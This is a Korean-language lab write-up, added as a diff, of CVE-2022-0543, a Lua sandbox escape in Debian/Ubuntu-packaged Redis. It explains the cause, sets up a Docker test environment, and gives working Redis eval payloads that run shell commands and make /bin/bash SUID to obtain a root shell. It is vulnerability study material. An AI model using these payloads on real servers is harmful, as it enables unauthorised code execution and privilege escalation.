@@ -1,0 +1,117 @@
+# CVE-2022-0543
+
+**Contributors**
+
+-   [박연준(@yeo0n)](https://github.com/yeo0n)
+
+<br/>
+
+### 요약
+-   Debian/Ubuntu의 패키징 문제로 인해 임의의 Lua 스크립트를 실행할 수 있는 원격 공격자가 Lua 샌드박스를 탈출하여 호스트에서 임의의 코드를 실행할 수 있습니다.
+>   https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543
+>   https://ine.com/blog/cve-20220543-lua-sandbox-escape-in-redis
+>   https://www.linode.com/ko/blog/security/linode-security-digest-cassandra-redis-snap-confine/
+>   https://nvd.nist.gov/vuln/detail/CVE-2022-0543
+
+<br/>
+
+### Redis란?
+
+-   Redis는 Key, Value 구조의 비정형 데이터를 저장하고 관리하기 위한 오픈 소스 기반의 비관계형 데이터 베이스 관리 시스템 (DBMS)입니다.
+-   데이터베이스, 캐시, 메세지 브로커로 사용되며 인메모리 데이터 구조를 가진 저장소입니다.
+
+<br/>
+
+### CVE-2022-0543 소개
+
+-   2022년 2월 Redis의 심각한 취약점이 보고되었습니다. Redis는 패키징 문제로 인해 (Debian 관련) Lua 샌드박스 이스케이프가 발생하기 쉽고 이로 인해 원격 코드가 실행될 수 있는 것으로 나타났습니다.
+-   주목해야 할 중요한 점은 이 취약점은 Debian 및 Debian 파생 Linux 배포만에만 적용된다는 것입니다. 업스트림 Redis는 영향을 받지 않습니다.
+-   Reginaldo Silva가 Debian/Ubuntu의 패키징 문제로 인해 임의의 Lua 스크립트를 실행할 수 있는 원격 공격자가 Lua 샌드박스를 이스케이프하여 호스트에서 임의의 코드를 실행할 수 있음을 발견했습니다.
+-   근본적인 원인은 Lua 라이브러리가 Debian 동적 라이브러리로 제공됩니다. "패키지"변수가 자동으로 채워지므로 임의의 Lua 기능에 대한 액세스가 허용됩니다. 예를 들어 이 기능은 "os"모듈의 "execute" 함수로 확장되면 임의의 Lua 코드를 실행할 수 있는 공격자가 임의의 셸 명령을 실행할 수 있습니다.
+
+<br/>
+
+### PoC 코드
+
+```
+eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("touch /root/redis_poc"); return 0' 0
+```
+
+<br/>
+
+### 환경 구성 및 실행
+
+-   터미널 창을 연 후, 다음 명령을 실행하여 Redis 서버 5.0.7 테스트 환경을 실행합니다.
+```
+docker compose up -d
+```
+
+-   서버가 시작된 후 다음 명령어를 통해 자격 증명 없이 이 서버에 연결할 수 있습니다. Redis 서버의 기본 설치에는 비밀번호가 없는 기본 사용자가 함께 제공됩니다. `redis-cli`
+```
+redis-cli -h your-ip
+```
+
+-   exit 명령어로 연결을 끊은 후, Docker로 연 redis 서버에서 다음 명령어로 실행 중인 프로세스를 식별합니다. (기본 포트인 6379에서 수신 대기중이며, Root로 실행되고 있음을 확인)
+```
+ps aux
+```
+
+-   Redis 서버에 다시 연결합니다.
+```
+redis-cli
+```
+![](1.png)
+
+-   PoC는 공유 Lua 라이브러리를 참조하기 때문에 사용 가능한 공유 Lua 라이브러리를 확인합니다.
+```
+ls -al /usr/lib/x86_64-linux-gnu/liblua*
+```
+![](2.png)
+
+-   redis-cli로 연결한 후 다음 PoC 코드를 입력합니다. (주의할 점: touch 뒤에 있는 경로를 pwd로 확인하여 확인하기 쉽게 변경)
+```
+redis cli
+eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("touch /root/redis_poc"); return 0' 0
+```
+
+-   이제 redis-cli를 종료하고 redis_poc 파일을 확인합니다.
+```
+exit
+ls -al
+```
+![](3.png)
+
+-   redis-cli에 연결하고 다음 `id`의 os 명령을 실행하는 페이로드를 입력합니다.
+```
+redis-cli
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
+```
+![](4.png)
+
+-   다음으로 루트 셸을 얻기 위해 Lua 샌드박스 이스케이프 익스플로잇을 활용하여 `bash`를 `SUID` 루트 바이너리로 만듭니다.
+```
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -al /bin/bash", "r"); local res = f:read("*a"); f:close(); return res' 0
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("chmod +s /bin/bash", "r"); local res = f:read("*a"); f:close(); return res' 0
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("ls -al /bin/bash", "r"); local res = f:read("*a"); f:close(); return res' 0
+```
+![](5.png)
+
+-   redis-cli를 종료하고 루트 셸을 얻기 위해 루트 사용자로 로그인합니다.
+```
+exit
+/bin/bash -p
+id
+```
+![](6.png)
+
+<br/>
+
+### 결과
+
+![](result.png)
+
+<br/>
+
+### 정리
+
+-   이 취약점은 Redis가 데비안 계열의 우분투 패키징 문제로 Lua 샌드박스를 이스케이프하여 호스트에서 임의의 코드를 실행할 수 있었습니다. 따라서 안전한 redis 서버를 운영하기 위해서 주기적으로 redis 버전을 확인하고 업데이트 하는 것이 필요합니다.
